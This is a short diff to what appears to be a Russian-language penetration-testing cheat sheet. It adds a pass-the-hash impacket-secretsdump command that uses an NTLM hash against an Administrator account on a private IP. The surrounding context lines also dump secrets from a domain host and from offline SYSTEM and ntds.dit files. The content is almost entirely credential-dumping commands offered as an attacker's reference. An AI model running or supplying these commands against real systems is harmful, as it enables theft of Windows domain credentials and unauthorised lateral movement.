@@ -44,6 +44,10 @@ impacket-secretsdump hacker.local/user:password@ip_adress
 
 impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL >> text  
 
+Распарсить на лету зная только хеш
+
+impacket-secretsdump Administrator@192.168.50.200 -hashes aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
+
 ----- Получить 10 последних пользователей
 
 Нужен system и security
